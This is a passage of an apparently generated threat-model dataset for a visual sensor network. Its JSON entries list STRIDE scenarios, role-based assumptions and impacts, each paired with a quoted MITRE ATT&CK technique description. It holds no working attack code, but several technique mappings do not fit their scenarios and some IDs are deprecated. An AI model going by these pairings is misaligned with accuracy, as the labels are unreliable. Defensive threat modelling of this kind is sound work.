                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack against the VSN to disrupt service.",
            "Assumptions": [
                {
                    "Assumption": "The VSN is exposed to the public internet.",
                    "Role": "System Architect",
                    "Condition": "Internet-facing service."
                },
                {
                    "Assumption": "DDoS mitigation measures are inadequate or nonexistent.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of DDoS protection."
                },
                {
                    "Assumption": "The attacker has access to resources for large-scale DDoS attacks.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet or similar tools."
                }
            ],
            "Potential Impact": "Disruption to system availability and access to live feeds.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Network Attack",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a server vulnerability to crash the VSN backend.",
            "Assumptions": [
                {
                    "Assumption": "Backend server has known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerability not remediated."
                },
                {
                    "Assumption": "The attacker has network access to target the server.",
                    "Role": "Attacker",
                    "Condition": "Network access secured."
                },
                {
                    "Assumption": "System does not have adequate failover mechanisms.",
                    "Role": "System Architect",
                    "Condition": "No failover systems."
                }
            ],
            "Potential Impact": "Service outage and loss of access to video data.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Server Exploit",
                "Service Outage",
                "Backend"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed packets to crash camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes are not equipped to handle malformed packets.",
                    "Role": "System Architect",
                    "Condition": "Inadequate packet handling."
                },
                {
                    "Assumption": "Network security does not prevent malformed packet delivery.",
                    "Role": "Network Engineer",
                    "Condition": "Weak network security."
                },
                {
                    "Assumption": "The attacker knows the communication protocol details.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of protocol specifics."
                }
            ],
            "Potential Impact": "Disruption of video feed collection and processing.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malformed Packets",
                "Node Crash",
                "Network"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a kernel vulnerability to gain root access to a camera node.",
            "Assumptions": [
                {
                    "Assumption": "The camera node has an unpatched kernel vulnerability.",
                    "Role": "System Administrator",
                    "Condition": "Kernel not updated."
                },
                {
                    "Assumption": "The attacker has a method to exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Exploit capability known."
                },
                {
                    "Assumption": "There are no privilege separation mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Lacking privilege separation."
                }
            ],
            "Potential Impact": "Complete control over the camera node and its data.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Kernel Exploit",
                "Root Access",
                "Camera Node"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits application vulnerabilities to escalate privileges on the backend server.",
            "Assumptions": [
                {
                    "Assumption": "Server application has known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Application not patched."
                },
                {
                    "Assumption": "Access controls are insufficient on the backend server.",
                    "Role": "Security Engineer",
                    "Condition": "Weak access control."
                },
                {
                    "Assumption": "The attacker has network access to the backend server.",
                    "Role": "Attacker",
                    "Condition": "Network access available."
                }
            ],
            "Potential Impact": "Unauthorized control over the backend server.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Application Exploit",
                "Backend Server",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Access Token Manipulation",
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
                "technique_id": "T1134"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses privilege escalation techniques to gain administrator access to the VSN.",
            "Assumptions": [
                {
                    "Assumption": "The VSN software has insufficient privilege boundary protections.",
                    "Role": "System Architect",
                    "Condition": "Poor privilege boundary enforcement."
                },
                {
                    "Assumption": "The attacker has compromised a low-privileged account.",
                    "Role": "Attacker",
                    "Condition": "Initial compromise successful."
                },
                {
                    "Assumption": "There are no adaptive monitoring mechanisms.",
                    "Role": "Security Analyst",
                    "Condition": "Lacking adaptive security monitoring."
                }
            ],
            "Potential Impact": "Complete control over the VSN and its data.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Privileged Access",
                "VSN Control",
                "User Account"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker falsifies network traffic to impersonate a legitimate camera node in the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted or authenticated.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient network security measures."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Intruder",
                    "Condition": "Successful network infiltration."
                },
                {
                    "Assumption": "Impersonated node is not monitored closely.",
                    "Role": "Security Team",
                    "Condition": "Ineffective monitoring and logging."
                }
            ],
            "Potential Impact": "Unauthorized access to visual data leading to information disclosure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs credentials to access the management interface of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Weak or known default credentials are used.",
                    "Role": "System Administrator",
                    "Condition": "Negligent credential management."
                },
                {
                    "Assumption": "Management interface is exposed to the internet.",
                    "Role": "Network Planner",
                    "Condition": "Poor network segmentation."
                },
                {
                    "Assumption": "Lack of multi-factor authentication mechanisms.",
                    "Role": "Security Architect",
                    "Condition": "Insufficient authentication protocols."
                }
            ],
            "Potential Impact": "Full control over the VSN leading to both data tampering and information disclosure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "management interface",
                "internet-facing"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering to trick operators into believing a malicious node is legitimate.",
            "Assumptions": [
                {
                    "Assumption": "Operators are not trained in recognizing social engineering tactics.",
                    "Role": "Training Coordinator",
                    "Condition": "Insufficient user training."
                },
                {
                    "Assumption": "Standard procedures for verifying nodes are not followed.",
                    "Role": "System Operator",
                    "Condition": "Lax adherence to protocols."
                },
                {
                    "Assumption": "Inadequate monitoring of node behavior.",
                    "Role": "Security Analyst",
                    "Condition": "Inefficient anomaly detection."
                }
            ],
            "Potential Impact": "Compromised node can collect and modify visual data.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "node",
                "device",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Social Media Accounts",
                "description": "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
                "id": "attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d",
                "technique_id": "T1586.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies image data in transit between camera nodes and the processing server.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Lack of data encryption."
                },
                {
                    "Assumption": "Attacker has access to network traffic.",
                    "Role": "Intruder",
                    "Condition": "Successful network infiltration."
                },
                {
                    "Assumption": "Insufficient integrity checks on data.",
                    "Role": "System Developer",
                    "Condition": "Lack of data integrity verification."
                }
            ],
            "Potential Impact": "Integrity of visual data is compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "MITM",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to a camera node and alters firmware, resulting in malicious firmware installed on devices.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process is not secure.",
                    "Role": "Firmware Developer",
                    "Condition": "Unsecure update mechanisms."
                },
                {
                    "Assumption": "Camera nodes have weak physical security.",
                    "Role": "Physical Security Manager",
                    "Condition": "Physically accessible devices."
                },
                {
                    "Assumption": "No logs are kept of firmware changes.",
                    "Role": "System Auditor",
                    "Condition": "Lack of auditing and logging."
                }
            ],
            "Potential Impact": "Unauthorized changes to device behavior and data corruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "hardware",
                "device modification",
                "firmware"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates configurations of visual data processing algorithms to produce inaccurate results.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not protected or encrypted.",
                    "Role": "Configuration Manager",
                    "Condition": "Unprotected file storage."
                },
                {
                    "Assumption": "Insufficient access controls to configuration files.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Lack of monitoring of configuration changes.",
                    "Role": "Security Analyst",
                    "Condition": "No configuration monitoring."
                }
            ],
            "Potential Impact": "Invalid or tampered processing results.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "data processing",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes logs to remove evidence of malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in an insecure manner.",
                    "Role": "System Auditor",
                    "Condition": "Insecure log storage."
                },
                {
                    "Assumption": "Lack of database access control.",
                    "Role": "Database Administrator",
                    "Condition": "Weak database security controls."
                },
                {
                    "Assumption": "No offsite logging or log monitoring.",
                    "Role": "Security Specialist",
                    "Condition": "No external log backups."
                }
            ],
            "Potential Impact": "Loss of traceability and incident forensic evidence.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "repudiation",
                "evidence hiding",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider modifies audit logs to conceal unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are not tamper-evident.",
                    "Role": "System Auditor",
                    "Condition": "Logs can be easily altered."
                },
                {
                    "Assumption": "Insiders have elevated permissions.",
                    "Role": "System Administrator",
                    "Condition": "Over-privileged access."
                },
                {
                    "Assumption": "Lack of real-time log monitoring.",
                    "Role": "Security Operations",
                    "Condition": "Delayed anomaly detection."
                }
            ],
            "Potential Impact": "Compromised system integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "insider threat",
                "audit log",
                "access control"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker disables logging services during an exploit to prevent detection.",
            "Assumptions": [
                {
                    "Assumption": "Logging services can be disabled via simple commands.",
                    "Role": "System Engineer",
                    "Condition": "Insecure log service control."
                },
                {
                    "Assumption": "No redundant log writing mechanisms.",
                    "Role": "Security Architect",
                    "Condition": "Single point of failure in logging."
                },
                {
                    "Assumption": "Weak system monitoring and alerting.",
                    "Role": "Security Team",
                    "Condition": "Dormant system monitoring."
                }
            ],
            "Potential Impact": "Actions go undetected, impacting incident response.",
            "MITRE ATT&CK Keywords": [
                "service disabling",
                "logging",
                "incident response",
                "system monitoring"
            ],
            "mitre_technique": {
                "name": "Disabling Security Tools",
                "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",
                "id": "attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044",
                "technique_id": "T1089"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data transmitted unencrypted over the network can be intercepted.",
            "Assumptions": [
                {
                    "Assumption": "Visual data is not encrypted during transmission.",
                    "Role": "Network Engineer",
                    "Condition": "No encryption protocols."
                },
                {
                    "Assumption": "Attackers can monitor network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                },
                {
                    "Assumption": "No data exfiltration monitoring.",
                    "Role": "Security Analyst",
